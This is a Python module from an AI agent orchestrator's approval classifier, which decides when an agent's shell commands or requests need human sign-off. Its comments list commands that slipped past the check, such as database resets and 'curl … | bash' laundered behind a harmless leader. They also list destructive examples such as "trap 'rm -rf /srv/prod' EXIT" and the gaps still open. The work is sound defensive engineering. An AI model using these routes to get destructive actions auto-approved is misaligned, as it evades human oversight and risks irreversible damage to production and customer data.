    packed = _park_list_packed_payload(words)
    if executable in _PARK_LIST_SSH_TRANSPORTS:
        return _park_list_strip_prefixes(_park_list_after_ssh_destination(words))
    if executable in _PARK_LIST_EXEC_TRANSPORTS and any(
        word.lower() == "exec" for word in words[1:]
    ):
        return _park_list_strip_prefixes(_park_list_after_exec(words))
    if packed is not None:
        return _park_list_strip_prefixes(packed)
    if executable in _PARK_LIST_INTERPRETERS:
        for index, word in enumerate(words[1:], start=1):
            if word.lower() == "-c":
                return _park_list_strip_prefixes(words[index + 1 :])
    return None


def _park_list_packed_payload(words: list[str]) -> list[str] | None:
    """``gcloud compute ssh --command=…`` / ``aws ssm send-command commands=…``.

    The value may be attached (``--command='halt'``) or already detached, because
    :func:`_park_list_commands` strips quotes before this runs — so an EMPTY value
    means the payload is simply the following tokens.
    """
    for index, word in enumerate(words[1:], start=1):
        lowered = word.lower()
        match = _PARK_LIST_PACKED_RE.match(lowered)
        if match is not None:
            packed = _segment_words(_PARK_LIST_WORDISH_RE.sub(" ", match.group(1)))
            return packed or words[index + 1 :]
        if lowered == "--command":
            return words[index + 1 :]
    return None


def _park_list_after_ssh_destination(words: list[str]) -> list[str]:
    """Everything after ``ssh [flags] destination`` -- i.e. the remote command."""
    index = 1
    while index < len(words):
        word = words[index].lower()
        if word.startswith("-"):
            index += 2 if word in _PARK_LIST_SSH_VALUE_FLAGS else 1
            continue
        return words[index + 1 :]
    return []


def _park_list_after_exec(words: list[str]) -> list[str]:
    """The command handed to ``kubectl|docker|podman exec``."""
    lowered = [word.lower() for word in words]
    if "--" in lowered:
        return words[lowered.index("--") + 1 :]
    start = lowered.index("exec") + 1
    seen_target = False
    index = start
    while index < len(words):
        word = lowered[index]
        if word.startswith("-"):
            index += 1
            continue
        if not seen_target:
            seen_target = True
            index += 1
            continue
        return words[index:]
    return []


def _park_list_commands(segment: str) -> list[list[str]]:
    """Every command a segment invokes, including nested remote/interpreter payloads.

    Quotes are removed and the text re-split here (and only here): a remote payload
    carries its own ``&&``/``;`` INSIDE the quotes, which the quote-aware split
    above deliberately did not cut.
    """
    commands: list[list[str]] = []
    unquoted = _PARK_LIST_QUOTE_RE.sub(" ", segment)
    for statement in _split_top_level(unquoted, _STATEMENT_SEPARATORS):
        for stage in _split_top_level(statement, ("|",)):
            words = _park_list_strip_prefixes(_segment_words(stage))
            if not words:
                continue
            commands.append(words)
            nested = _park_list_nested_payload(words)
            depth = 0
            while nested and depth < _PARK_LIST_MAX_NESTING:
                commands.append(nested)
                nested = _park_list_nested_payload(nested)
                depth += 1
    return [command for command in commands if command]


def _park_list_wordish(text: str) -> str:
    """Flatten to bare words so ``--prod`` / ``k8s/prod`` / ``deploy:prod`` read."""
    return _PARK_LIST_WORDISH_RE.sub(" ", text.lower())


def _park_list_is_remote(segment: str) -> bool:
    """Remote execution, per this module's SINGLE existing definition of remote."""
    return _is_remote_command(segment) or _leading_executable(segment) in _PARK_LIST_SSH_TRANSPORTS


def _park_list_names_production(words: list[str]) -> bool:
    return _PRODUCTION_TARGET_RE.search(_park_list_wordish(" ".join(words))) is not None


def _park_list_is_production_deploy(words: list[str]) -> bool:
    """True when THIS command line deploys to a live environment."""
    lowered = [word.lower() for word in words]
    if any(word.startswith(_DEPLOY_INERT_MARKERS) for word in lowered):
        return False
    executable = Path(lowered[0]).name
    operands = lowered[1:]
    for name, required in _PRODUCTION_DEFAULT_DEPLOYS:
        if executable == name and all(token in operands for token in required):
            return True
    if not _park_list_names_production(lowered):
        return False
    for name, required in _PRODUCTION_MARKED_DEPLOYS:
        if executable == name and all(token in operands for token in required):
            return True
    if _DEPLOY_VERB_RE.search(_park_list_wordish(executable)) is not None:
        return True
    if executable in _PARK_LIST_TASK_RUNNERS:
        window = _park_list_operand_window(lowered, limit=2)
    elif executable in _PARK_LIST_INTERPRETERS:
        window = _park_list_operand_window(lowered, limit=1)
    else:
        return False
    return any(_DEPLOY_VERB_RE.search(_park_list_wordish(token)) is not None for token in window)


def _park_list_is_destructive_command(words: list[str]) -> bool:
    """True when THIS command line's EXECUTABLE destroys or halts host state."""
    lowered = [word.lower() for word in words]
    executable = Path(lowered[0]).name
    if executable in _REMOTE_DESTRUCTIVE_COMMANDS or executable.startswith(
        _REMOTE_DESTRUCTIVE_PREFIXES
    ):
        return True
    modes = _REMOTE_DESTRUCTIVE_SUBCOMMANDS.get(executable)
    if not modes:
        return False
    candidates = set(_park_list_operand_window(lowered, limit=2))
    candidates.update(word for word in lowered[1:] if word.startswith("-"))
    return bool(candidates & modes)


def park_list_surface(request: ApprovalRequest) -> str | None:
    """The enumerated non-finance surface this request lands on, or ``None``.

    Callers MUST treat a raised exception as a PARK (see
    :func:`_classify_request_detail`): an unevaluable park-list is exactly the
    uncertainty this module always resolves to "ask a human".
    """
    if _is_structurally_read_only(request):
        # A proven read (GET, a read-shaped operation, a trusted read tool) is
        # neither a deploy nor a remote destruction, whatever words it carries.
        return None
    if not _park_list_class_floor_reached(_action_class_label(request)):
        return None

    for field in _park_list_fields(request):
        for segment in _park_list_segments(field):
            commands = _park_list_commands(segment)
            if _park_list_is_remote(segment) and any(
                _park_list_is_destructive_command(command) for command in commands
            ):
                return PARK_LIST_REMOTE_DESTRUCTIVE
            if any(_park_list_is_production_deploy(command) for command in commands):
                return PARK_LIST_PRODUCTION_DEPLOY
    return None


# ---------------------------------------------------------------------------
# H4 (LS-022) -- the UNRECOGNISED-ACTION floor on the HIGH-VALUE surface.
# ---------------------------------------------------------------------------
#
# WHAT WAS BROKEN. Every rule above that asks "is this destructive?" answers it
# from an ENUMERATED VERB VOCABULARY (``_DESTRUCTIVE_VERB_RE`` /
# ``_VALUE_MOVE_VERB_RE``). ``_durable_write_floor`` is a conjunction of a verb
# half and a noun half, and it is only ever as good as its verb half. LiveSim
# measured the consequence on the live resolver:
#
#     reset the production database to factory state   -> AUTO-APPROVED
#     python manage.py reset_db --env production        -> AUTO-APPROVED
#     format the customer table                         -> AUTO-APPROVED
#
# "reset" and "format" are simply not on the list, so the floor's verb half never
# fired despite a production/customer noun standing right next to it, and the
# classifier's final fall-through approved. An UNKNOWN verb was indistinguishable
# from a known-safe one -- unknown read as favourable, which is the defect class,
# not the individual words.
#
# WHY NOT JUST ADD "reset" AND "format". Because that is the denylist move this
# file's own header already calls a loss: the next request is by definition the
# phrasing nobody wrote down. The direction has to invert.
#
# WHY NOT INVERT THE WHOLE CLASSIFIER. "Unrecognised -> park" applied to every
# request is an allowlist of all legitimate engineering, and this product runs
# ``make build`` and ``pytest -q`` hands-off. Parking everything is exactly as
# broken as approving everything (:mod:`tests.orchestrator.test_approvals_golden_corpus`
# exists to tell those two apart).
#
# THE SCOPE, THEREFORE: invert the verb half, and ONLY on the surface where being
# wrong is unrecoverable -- money, customer records, production. On that surface a
# request must PROVE it is ordinary; off it, nothing changes at all. Three escapes
# keep the inversion honest, and each is the same proof an existing floor accepts:
#
#   * a STRUCTURALLY PROVEN read (``GET``, a read-shaped operation, a trusted read
#     tool) is not a mutation, whatever verb describes it;
#   * a target PROVEN bounded (isolated temp root / granted scope) needs no human;
#   * a RECOGNISED action verb -- a read, an ordinary file operation, a build/test/
#     VCS command, or (already handled above) a destructive/value-move verb.
#
# THE UNIT OF JUDGEMENT IS THE REQUEST, NOT THE LINE. Once the request names the
# high-value thing ANYWHERE, every readable line in it has to be recognised. This
# module's own history is why: ``echo ok; curl … | bash`` auto-approved because a
# transparent LEADER laundered the dangerous downstream. The first version of this
# floor judged only the lines that themselves named the surface, and that reopened
# the same laundering in the other direction -- ``cd /srv/production/app && python
# manage.py reset_db`` split the marker and the action across a separator and no
# single line was both aimed and unrecognised. Splitting is free, so a per-line
# test cannot hold; ``test_a_recognised_leading_command_cannot_launder_an_
# unrecognised_one`` and its parametrised laundering vectors pin the request-wide
# rule instead.
#
# CONTENT IS NOT AN ACTION, here as everywhere else in this file. A here-document
# BODY and an inline ``-c`` PROGRAM are content: they are what is being written or
# interpreted, not the verb of the request. They are stripped before this floor
# reads the text, which is what keeps ``python -c "print('swift')"`` and
# ``cat > REVIEW.md <<'EOF' … production … EOF`` hands-off. The delete/money/secret
# signal floors above still read them in full -- that is their job, not this one's.
#
# PLAIN LANGUAGE IS THE ONE PLACE THE SURFACE GATE COMES OFF. A request with no
# tool and no tool input (``ApprovalRequest("vaporize the staging cluster",
# "consequential")``) has NOTHING but its prose: no provider to bind, no method to
# prove a read, no path to prove a bounded target. There, an unrecognised head
# verb parks whatever nouns it does or does not name -- and a RECOGNISED
# destructive verb parks too, because in prose that verb is evidence of intent,
# not the clearance it is on a structured request (``clear the audit trail``
# reaches this floor only because "audit trail" is in no noun list). This costs
# nothing live: every hook-eval request carries a tool name and tool input.
#
# MEASURED, NOT ASSUMED, AND THE MEASUREMENT IS COMMITTED. Rebuild it with
# ``scripts/approval_corpus_probe.py ab --base-rev <base>``; the corpus is not
# committed (it is real shell history) but the harvester and the manifest hash
# are, so the numbers below can be re-derived rather than taken on trust. The
# first version of this floor cited 8,496 commands and 0.11% from an uncommitted
# script and neither figure reproduced -- see the LSC-05 review finding.
#
# Against 178,393 DISTINCT real agent shell commands from all 14 transcript roots
# on this machine, this floor parks 270 that auto-approve at the base commit
# (0.151%), on top of the 24,192 (13.6%) the existing floors already park, and it
# UN-PARKS NOTHING (0, re-measured after every change). Requiring EVERY line of a
# request to be recognised -- LSC-01, and now the rule -- cost 490 of those 270
# before the parser artefacts underneath it were fixed: line continuations,
# comment lines and shell control structure were being asked to look like
# recognised commands. The alternatives that stay rejected: widening the surface
# to this module's own ``_PRODUCTION_NOUN_RE``/``_CUSTOMER_NOUN_RE``, and dropping
# the surface gate for STRUCTURED requests -- the park-all the golden corpus
# exists to prevent.
#
# KNOWN RESIDUE, recorded rather than hidden, and re-verified at this commit:
#   * an inline program (``python -c "<code>"``) is judged by the signal floors
#     above and not by this one, so an unrecognised verb inside one is invisible
#     here. Closing it needs an AST-shaped rule, not another word list.
#   * ``ledger`` no longer arms the money half of this floor (see
#     ``_floor_names_money``): an unrecognised verb aimed at a bare "ledger" and
#     nothing else auto-approves. Bought with 455 measured false parks on this
#     estate's own telemetry tooling; ``_durable_write_floor`` still covers it
#     wherever a destructive verb proves intent.
#   * an earlier version of this comment claimed ``sqlite3 app.db "UPDATE
#     customers …"`` auto-approves. It does not, and did not -- ``_CUSTOMER_WRITE_RE``
#     has always parked it. The residue that WAS real is a SQL write against a
#     table this module had no noun for (``psql -c "UPDATE accounts SET …"``), and
#     it is closed in ``_CUSTOMER_WRITE_RE`` rather than here, because SQL
#     ``UPDATE`` is a RECOGNISED verb and this floor only judges unrecognised ones.

# The customer half is deliberately NARROWER than ``_CUSTOMER_NOUN_RE``: on an
# INVERTED rule, every loose noun is a false park. "client" (HTTP clients, test
# clients, ``mcp_client``), "account", "profile", "contact", "member" and "tenant"
# are ubiquitous in ordinary engineering text; "customer"/"subscriber"/"cardholder"
# name a real person whose data or money this system holds.
_HIGH_VALUE_CUSTOMER_RE = re.compile(
    r"\b(?:customer|customers|subscriber|subscribers|cardholder|cardholders)\b"
)

# Audit triggers. These are NOT ``HardStop`` members and NOT park-list triggers:
# the reason PREFIX stays "parked per finance-only policy" on purpose, because
# ``omniagentos/toolplane/session.py::_DENIAL_CODES`` maps reason PREFIXES to
# denial codes and an unknown prefix would be recorded as a plain ``denied``
# instead of ``approval_required``. The new information travels in the trigger.
UNRECOGNISED_ACTION_TRIGGERS: dict[HardStop, str] = {
    "money": "unrecognised-money-action",
    "customer": "unrecognised-customer-action",
    "delete": "unrecognised-production-action",
}
# A plain-language request names no surface at all; saying "production" there
# would be a false statement in the audit trail.
UNRECOGNISED_PLAIN_LANGUAGE_ACTION = "unrecognised-plain-language-action"
# The tool input could not be read to the end (too deep, or too many values), so
# the request was never shown to be OFF the surface -- only shown to be
# unreadable. Named separately so the audit trail does not claim a target the
# module never actually saw.
UNRECOGNISED_OPAQUE_INPUT_ACTION = "unrecognised-opaque-input-action"
# Fail-closed sentinel: this floor could not be evaluated at all.
UNRECOGNISED_ACTION_UNEVALUABLE = "unrecognised-action-unevaluable"
# ``ApprovalDecision.notification_id`` when a notifier WAS supplied and the page
# did not land -- distinct from ``None``, which means no notifier was supplied.
# Not confusable with a real notification id (those are ``ntf_``-prefixed).
ESCALATION_DELIVERY_FAILED = "delivery-failed"

# The ALLOWLIST. Unlike every vocabulary above it, forgetting an entry here costs
# a false PARK (visible, recoverable, one human decision) rather than an unreviewed
# destructive action (invisible, irreversible). That asymmetry is the entire point
# of inverting the direction, and it is why this list may be extended freely.
_RECOGNISED_ACTION_TOKENS: frozenset[str] = frozenset(
    {
        # -- read / inspect / navigate --
        "ls",
        "ll",
        "cat",
        "bat",
        "head",
        "tail",
        "less",
        "more",
        "grep",
        "rg",
        "ack",
        "ag",
        "find",
        "fd",
        "locate",
        "which",
        "whereis",
        "type",
        "file",
        "stat",
        "wc",
        "diff",
        "cmp",
        "jq",
        "yq",
        "awk",
        "sed",
        "sort",
        "uniq",
        "cut",
        "tr",
        "tee",
        "xargs",
        "column",
        "od",
        "hexdump",
        "strings",
        "readlink",
        "realpath",
        "basename",
        "dirname",
        "pwd",
        "date",
        "cal",
        "uptime",
        "uname",
        "whoami",
        "id",
        "hostname",
        "du",
        "df",
        "ps",
        "top",
        "htop",
        "pgrep",
        "lsof",
        "netstat",
        "ss",
        "ping",
        "dig",
        "nslookup",
        "traceroute",
        "curl",
        "wget",
        "http",
        "httpie",
        "open",
        "sleep",
        "wait",
        "true",
        "false",
        "yes",
        "seq",
        "env",
        "printenv",
        "export",
        "set",
        "unset",
        "cd",
        "pushd",
        "popd",
        "man",
        "info",
        "help",
        "tree",
        "watch",
        "time",
        "timeout",
        "echo",
        "printf",
        "ledger",
        "wis",
        # Checksums and media inspection: they read bytes and, at worst, write a
        # derived file. Measured as three of the largest false-park drivers on
        # real traffic (LSC-05).
        "shasum",
        "sha1sum",
        "sha256sum",
        "sha512sum",
        "md5",
        "md5sum",
        "cksum",
        "b2sum",
        "ffmpeg",
        "ffprobe",
        "ffplay",
        "sips",
        # Dev servers. They SERVE; they take no destructive subcommand, and they
        # are the ordinary work that the LSC-06 ``--host`` rule would otherwise
        # park. ``django-admin``/``rails``/``manage.py`` are deliberately ABSENT:
        # those are the LS-022 shape, where the action is in the subcommand.
        "uvicorn",
        "gunicorn",
        "hypercorn",
        "daphne",
        "nodemon",
        "vite",
        "ngrok",
        # Builtins that take no command operand. ``trap``/``local``/``declare``
        # are deliberately ABSENT: their operand can be a command
        # (``trap 'rm -rf /srv/prod' EXIT``), which is the shape this list must
        # never wave through.
        "exit",
        "return",
        "break",
        "continue",
        "shift",
        "sqlite3",
        "sqlite",
        "psql",
        "mysql",
        "duckdb",
        "redis-cli",
        # -- ordinary file work --
        "mkdir",
        "touch",
        "cp",
        "mv",
        "ln",
        "tar",
        "zip",
        "unzip",
        "gzip",
        "gunzip",
        "zcat",
        "split",
        "patch",
        "chmod",
        "rsync",
        "scp",
        "pdftotext",
        "plutil",
        "defaults",
        # Editors: OPENING a file is not acting on what the file describes --
        # pinned by test_approvals_park_list.py's ``vim infra/prod/deploy.tf``.
        "vim",
        "vi",
        "nvim",
        "emacs",
        "nano",
        "pico",
        "code",
        "subl",
        # -- build / test / lint / package --
        "pytest",
        "tox",
        "nox",
        "coverage",
        "ruff",
        "mypy",
        "black",
        "isort",
        "flake8",
        "pylint",
        "eslint",
        "prettier",
        "tsc",
        "uv",
        "pip",
        "pipx",
        "pdm",
        "conda",
        "brew",
        "gcc",
        "clang",
        "cmake",
        "go",
        "cargo",
        "rustc",
        "javac",
        "dotnet",
        "swiftc",
        # "format" is deliberately ABSENT: `format the customer table` is an
        # LS-022 vector, and `ruff format` / `npm run format` are recognised by
        # their executable ("ruff") or their runner's verb ("run") instead.
        "build",
        "test",
        "tests",
        "check",
        "lint",
        "typecheck",
        "install",
        "ci",
        "sync",
        "run",
        "exec",
        "start",
        "serve",
        "dev",
        "bench",
        "benchmark",
        "plan",
        "apply",
        "validate",
        "verify",
        "compile",
        "generate",
        "render",
        # The DEPLOY surface is owned by C1's park-list (a production deploy at
        # CONSEQUENTIAL-or-higher), which runs BEFORE this floor and has its own
        # ratified class floor. Recognising the verb here keeps this floor from
        # silently re-deciding that ruling below the class floor -- pinned by
        # test_approvals_park_list.py::test_the_class_floor_is_load_bearing.
        "deploy",
        "redeploy",
        "rollout",
        "cutover",
        "promote",
        "publish",
        "release",
        # -- VCS / platform read + ordinary subcommands --
        "git",
        "gh",
        "status",
        "log",
        "logs",
        "show",
        "blame",
        "branch",
        "commit",
        "add",
        "stash",
        "worktree",
        "clone",
        "fetch",
        "pull",
        "push",
        "rev",
        "describe",
        "get",
        "list",
        "read",
        "view",
        "print",
        "ls-files",
        "ls-remote",
        "rev-parse",
        "pods",
        "nodes",
        "namespaces",
        "images",
        "compose",
        "config",
        "version",
        "history",
    }
)

# Prose verbs, which inflect ("checking", "reviewed", "investigating"). Matched as
# a WHOLE word so a two-letter tool name can never absorb an unrelated word --
# ``tr\w*`` would otherwise make "truncate" read as the ``tr`` utility.
_RECOGNISED_ACTION_VERB_RE = re.compile(
    r"(?:check|verify|confirm|validate|review|inspect|examine|investigate|explore|audit|"
    r"analy[sz]e|measure|compare|count|summari[sz]e|report|describe|explain|document|"
    r"understand|read|look|see|list|show|display|print|render|draft|plan|note|record|"
    r"write|edit|update|add|append|create|generate|build|compile|test|lint|run|"
    r"start|restart|serve|watch|monitor|trace|debug|profile|benchmark|fix|refactor|"
    r"rename|move|copy|install|upgrade|migrate|commit|push|pull|merge|rebase|tag|"
    r"search|find|fetch|get|retrieve|query|lookup|open|close|enable|configure|"
    r"schedule|queue|retry|resume|continue|finish|complete)\w*"
)

# Executables whose OWN NAME says nothing about what will happen: the action is in
# the operand. ``python manage.py reset_db`` is the LS-022 vector precisely because
# "python" is ordinary and "reset_db" is not.
_PASS_THROUGH_EXECUTABLES: frozenset[str] = (
    _PARK_LIST_INTERPRETERS
    | _PARK_LIST_TASK_RUNNERS
    | _PARK_LIST_SSH_TRANSPORTS
    | _PARK_LIST_EXEC_TRANSPORTS
    | _COMMAND_PREFIXES
)
# A SHELL's ``-c`` operand is a command line and is judged as one; a LANGUAGE
# interpreter's ``-c`` operand is a program, i.e. content.
_SHELL_INTERPRETERS: frozenset[str] = frozenset(
    {"bash", "sh", "zsh", "ksh", "dash", "ash", "csh", "tcsh", "fish"}
)
_TRANSPORT_EXECUTABLES: frozenset[str] = (
    _PARK_LIST_SSH_TRANSPORTS | _PARK_LIST_EXEC_TRANSPORTS | _SHELL_INTERPRETERS
)

# ``<<EOF … EOF`` / ``<<-'PY' … PY``. Never ``<<<`` (a here-STRING has no body
# terminator, and the character after ``<<`` is not a word character).
_HEREDOC_BODY_RE = re.compile(
    r"<<-?\s*(['\"]?)(\w+)\1.*?(?:^[ \t]*\2[ \t]*$|\Z)", re.DOTALL | re.MULTILINE
)
# An inline program handed to an interpreter.
_INLINE_PROGRAM_RE = re.compile(r"(?:^|\s)(?:-c|-e|--eval)\s+(?:\"[^\"]*\"|'[^']*'|\S+)")
# A serialized payload. ``api/routes/sessions.py::_format_proposed_action`` falls
# back to ``"<ToolName> <compact json of the tool input>"`` for any tool without a
# command/path field, which smuggles a subagent ``prompt``/``description`` -- text
# this module deliberately never scans -- into the proposed action. A Task prompt
# that merely MENTIONS production is not an action against production.
_JSON_PAYLOAD_RE = re.compile(r"\{[^{}]*\}")


def _strip_action_content(field: str) -> str:
    """Drop the spans that are CONTENT rather than the verb of the action."""
    text = _INLINE_PROGRAM_RE.sub(" ", _HEREDOC_BODY_RE.sub(" ", field))
    for _ in range(3):  # bounded: collapse nested payloads from the inside out
        collapsed = _JSON_PAYLOAD_RE.sub(" ", text)
        if collapsed == text:
            break
        text = collapsed
    return text


def _is_plain_language_request(request: ApprovalRequest) -> bool:
    """True when the PROSE is the only evidence there is.

    No tool, no structured input -- nothing to prove a read, a bounded target or a
    provider from. Every live hook-eval request carries ``tool_name`` and
    ``tool_input`` (``api/routes/sessions.py``), so this is the orchestrator's own
    "plain language proposed action" shape, and it is the one shape where the
    module has no structured evidence to fall back on.
    """
    return not str(request.tool_name or "").strip() and not (request.tool_input or {})


# ``ledger`` is the one entry in ``_MONEY_NOUN_RE`` that names a RECORD rather
# than a value, and on this estate it overwhelmingly names TOOLING:
# ``scripts/fleet-ledger.py``, ``var/**/ledger.sqlite3``, ``OMNIAGENTOS_LEDGER_DIR``,
# ``~/.omniagentos/ops/bin/ledger``, branch ``feat/ledger-kanban``. It is also already in
# ``_RECOGNISED_ACTION_TOKENS`` -- the same token simultaneously clearing this
# floor as an action and arming its strictest half as a noun. Measured, it was the
# single largest false-park driver on real traffic, and false parks on an
# operator's own telemetry tooling are the ones that teach them to click through.
#
# SCOPED TO THIS FLOOR ONLY. ``_MONEY_NOUN_RE`` is untouched, so
# ``_durable_write_floor`` still parks ``truncate the ledger`` on the destructive
# verb it can actually see -- which is where a record-keeping noun belongs. What
# this gives up is an UNRECOGNISED verb aimed at a bare "ledger" and nothing else;
# that is the declared residue, and it is bought with 455 measured false parks.
_LEDGER_NOUN_RE = re.compile(r"\bledgers?\b")


def _floor_names_money(text: str) -> bool:
    """:func:`_names_money`, minus the case where "ledger" is the only evidence."""
    if not _names_money(text):
        return False
    return _names_money(_LEDGER_NOUN_RE.sub(" ", text))


# LSC-06. The production half was the literal marker ``prod|production``, so a
# request that named its environment ANY OTHER WAY was off the surface entirely:
#
#     python manage.py reset_db --env live          -> AUTO-APPROVED
#     python manage.py reset_db --env main          -> AUTO-APPROVED
#     python manage.py reset_db --host db.company.com -> AUTO-APPROVED
#
# THE REVIEWER'S SUGGESTED FIX WAS MEASURED AND REJECTED. Adding ``live``,
# ``master`` and ``primary`` to the marker costs 339 extra false parks on 178,393
# real commands (+125% on the rate), and its biggest drivers are ``sqlite_master``
# -- a read of SQLite's own system catalog -- and this estate's LiveSim suite.
# Neither word reliably means "the production environment"; they mean "not a
# snapshot" and "the default branch".
#
# THE STRUCTURAL VERSION COSTS 28. What those commands have in common is not a
# word, it is a SHAPE: they carry an explicit flag naming which environment, host
# or database to act on. A request that has to SAY which environment it means is,
# by its own account, not aimed at the default one -- and that is decidable
# without guessing which names an operator gave their environments. It arms this
# floor only, so an unrecognised action is what it costs; every recognised one
# (``pytest --env ci``, ``uvicorn --host 0.0.0.0``) still stands it down.
#
# DECLARED RESIDUE, because "cheaper" was measured and "equivalent in coverage"
# was never true. This arm keys on the environment being named IN THE REQUEST, so
# a request that SELECTS production without SAYING so is not on the surface at
# all and no arm of this floor reaches it. Verified by execution, today, here:
#
#     python manage.py reset_db          -> AUTO-APPROVED  (settings module)
#     python manage.py flush --noinput   -> AUTO-APPROVED  (settings module)
#     rake db:reset                      -> AUTO-APPROVED  (RAILS_ENV)
#     npx prisma migrate reset --force   -> AUTO-APPROVED  (DATABASE_URL)
#
# The equivalent shapes that DO name their target are already covered, and were
# also checked rather than assumed: ``psql prod-db.internal -c 'truncate
# customers'`` parks on the literal marker inside a positional hostname,
# ``kubectl delete pods --all`` and ``terraform apply`` park on the deploy/delete
# rules above. What is open is narrower than "ambient config" in general: an
# ambient selector AND an unenumerated verb AND no money/customer/production word
# anywhere in the text. Closing it needs evidence this module does not have --
# request text cannot say which environment $KUBECONFIG or settings.py points at
# -- so it is recorded rather than left to read as closed. Every entry above is a
# false APPROVE, which is why it is named here and not buried in a report.
_TARGETED_ENVIRONMENT_FLAG_RE = re.compile(
    r"(?:^|\s)--?(?:env|environment|settings|host|hostname|database|dsn|cluster|stage|"
    r"tier|deployment)(?:=|\s+)\S"
)


def _high_value_surface(text: str) -> HardStop | None:
    """The unrecoverable surface this text names, or ``None``.

    Ordered by consequence: money first, then the people whose records this is,
    then production -- either named outright or targeted by flag.  The returned
    label is a frozen ``HardStop`` member so the AD-15 vocabulary (and
    :class:`NotificationEscalator`'s labels) stay closed.
    """
    if _floor_names_money(text):
        return "money"
    if _HIGH_VALUE_CUSTOMER_RE.search(text) is not None:
        return "customer"
    if _PRODUCTION_TARGET_RE.search(text) is not None:
        return "delete"
    if _TARGETED_ENVIRONMENT_FLAG_RE.search(text) is not None:
        return "delete"
    return None


def _high_value_surface_without_flag(text: str) -> HardStop | None:
    """:func:`_high_value_surface` minus the targeting-flag arm.

    Used to tell "this request names a high-value NOUN" -- which the floors above
    can see and have already judged -- from "this request only names an
    environment by flag", which they cannot see at all.
    """
    if _floor_names_money(text):
        return "money"
    if _HIGH_VALUE_CUSTOMER_RE.search(text) is not None:
        return "customer"
    if _PRODUCTION_TARGET_RE.search(text) is not None:
        return "delete"
    return None


def _is_recognised_action_token(token: str, *, risk_verb_clears: bool = True) -> bool:
    """True when this token NAMES a known action.

    Only the FIRST word of the token counts: a path operand
    (``k8s/prod/app.yaml``) is not a verb, and letting any embedded word match
    would let ``reset_db_test`` pass on the word "test".

    ``risk_verb_clears`` is what a STRUCTURED request gets: an already-enumerated
    destructive / value-move verb has been judged by the floors above, and their
    standing down is a decision (a proven read, a proven bounded target, additive
    SQL), not an omission. A PLAIN-LANGUAGE request has no such structure, so
    there the same verb is evidence of destructive intent, not a clearance --
    ``clear the audit trail`` reaches here only because the noun half of
    :func:`_durable_write_floor` has no entry for "audit trail".
    """
    if token in _SHELL_TEST_BUILTINS:
        # ``[`` / ``[[`` / ``:`` are commands whose token holds no word at all.
        return True
    words = _park_list_wordish(token).split()
    if not words:
        return False
    word = words[0]
    if word in _RECOGNISED_ACTION_TOKENS or _RECOGNISED_ACTION_VERB_RE.fullmatch(word):
        return not (
            not risk_verb_clears
            and (_DESTRUCTIVE_VERB_RE.match(word) or _VALUE_MOVE_VERB_RE.match(word))
        )
    if not risk_verb_clears:
        return False
    return (
        _DESTRUCTIVE_VERB_RE.match(word) is not None or _VALUE_MOVE_VERB_RE.match(word) is not None
    )


# A task runner's own subcommand is part of the TRANSPORT, not the action:
# ``poetry run python manage.py reset_db`` says "reset_db", not "run". Only
# recognised AFTER a pass-through executable, so a bare ``run …`` is still judged
# on its own head token.
_RUNNER_SUBCOMMANDS: frozenset[str] = frozenset({"run", "exec", "runx"})

# Shell CONTROL STRUCTURE. Deliberately NOT entries in
# ``_RECOGNISED_ACTION_TOKENS``: putting them there made
# ``then python manage.py reset_db`` clear this floor on the word "then" -- LSC-01's
# laundering, one token further in, and caught by LSC-05's own test. They are
# SKIPPED like a transport instead, so whatever follows them is what gets judged.
# ``eval``/``source``/``.`` are absent for the opposite reason: they execute a
# string as code, which is the opaque-payload rule's business, not a free pass.
_SHELL_STRUCTURE_KEYWORDS: frozenset[str] = frozenset(
    {
        "if",
        "then",
        "elif",
        "else",
        "fi",
        "while",
        "until",
        "do",
        "done",
        "esac",
        "function",
        "{",
        "}",
        "(",
        ")",
        ";;",
        "!",
    }
)
# ...except these three, whose "line" is a loop / case HEADER and names no command
# at all (``for r in a b``, ``case $x in``). There is nothing there to recognise,
# so the line is dropped rather than judged.
_SHELL_HEADER_KEYWORDS: frozenset[str] = frozenset({"for", "case", "select"})
# Read-only test builtins whose token carries no word for ``_park_list_wordish``
# to find, so they need matching on the raw token.
_SHELL_TEST_BUILTINS: frozenset[str] = frozenset({"[", "[[", ":"})
# How many values a tool input may contribute to the surface text before the walk
# gives up and declares itself INCOMPLETE (never "clean").
_TOOL_INPUT_MAX_PARTS = 256
# Bounded, because this walks attacker-shaped text: `sudo env bash -c` style
# chains are a handful of hops, never dozens.
_VERB_SLOT_MAX_SKIPS = 8

# Words that precede the verb of an English request without being it.
_PROSE_FILLER_WORDS: frozenset[str] = frozenset(
    {
        "please",
        "kindly",
        "then",
        "now",
        "also",
        "and",
        "next",
        "first",
        "finally",
        "just",
        "lets",
        "let",
        "us",
        "we",
        "i",
        "you",
        "to",
        "can",
        "could",
        "would",
        "should",
        "must",
        "the",
        "a",
        "an",
        "go",
        "ahead",
    }
)


def _action_verb_slots(words: list[str], *, prose_only: bool = False) -> list[str] | None:
    """The tokens that say WHAT one line does, or ``None`` for a line that says
    nothing (a bare interpreter whose program was stripped as content).

    In PROSE the operand window is the OBJECT of the sentence, not a verb slot --
    reading it would let ``clear the audit trail`` pass on the noun "audit". Only
    the head verb counts there, past fillers and adverbs.
    """
    lowered = [word.lower() for word in words]
    if prose_only:
        for word in lowered:
            head = _park_list_wordish(word).split()
            if not head:
                continue
            candidate = head[0]
            if candidate in _PROSE_FILLER_WORDS or candidate.endswith("ly"):
                continue
            return [candidate]
        return None
    # Pass-through executables CHAIN, and a two-operand window is not deep enough
    # to survive the chain: ``bundle exec rake db:reset`` spent its whole window on
    # "exec" and "rake" -- both recognised, neither the action -- and the task that
    # actually resets the database was never looked at (LSC-01). Walk past every
    # leading pass-through and its flags first, so the window opens where the
    # action is named. Bounded, because this is parsing attacker-shaped text.
    start = 0
    for _ in range(_VERB_SLOT_MAX_SKIPS):
        while start < len(lowered) and lowered[start].startswith("-"):
            start += 1
        if start >= len(lowered):
            break
        token = lowered[start]
        if token in _SHELL_HEADER_KEYWORDS:
            return None
        name = Path(token).name
        if (
            name in _PASS_THROUGH_EXECUTABLES
            or token in _SHELL_STRUCTURE_KEYWORDS
            or (start > 0 and name in _RUNNER_SUBCOMMANDS)
        ):
            start += 1
            continue
        break
    while start < len(lowered) and lowered[start].startswith("-"):
        start += 1
    if start >= len(lowered):
        # Nothing but transports, structure and flags: the line names no action.
        return None
    head = lowered[start:]
    slots: list[str] = []
    if Path(head[0]).name not in _PASS_THROUGH_EXECUTABLES:
        slots.append(Path(head[0]).name)
    slots.extend(_park_list_operand_window(head, limit=2))
    # A slot with no word in it (``\``, ``]``, ``2>&1``, ``;``) is punctuation,
